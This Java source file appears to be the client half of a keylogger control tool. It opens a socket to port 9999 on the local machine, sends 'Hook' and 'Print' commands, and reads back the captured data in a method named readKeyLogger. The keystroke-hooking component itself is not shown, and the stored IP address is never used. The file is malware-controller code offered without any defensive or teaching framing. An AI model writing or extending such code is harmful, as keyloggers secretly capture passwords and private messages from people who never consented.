package model;

import javax.swing.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;

public class Client
{
    public Client()
    {
        initComponents();
    }

    private void initComponents()
    {
        //
    }

    public String createSocket()
    {
        try
        {
            sock = new Socket(InetAddress.getLocalHost(), 9999);

            is = sock.getInputStream();
            os = sock.getOutputStream();
        }
        catch (Exception e)
        {
            return e.toString();
        }

        return "Success";
    }

    public void setIP(String IP) {
        this.IP = IP;
    }

    public String readKeyLogger(String command)
    {
        try
        {
            byte[] msg = command.getBytes();
            os.write(msg);

            switch(command)
            {
                case "Hook":
                    isHook = true;
                    break;
                case "Print":
                    byte[] buffer = new byte[5 * 1024];
                    is.read(buffer);
                    String out = new String(buffer);
                    out = out.trim();
                    return out;
            }
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }

        return "";
    }

    private Boolean isHook = false;
    private Socket sock;
    private String IP;
    private InputStream is;
    private OutputStream os;
}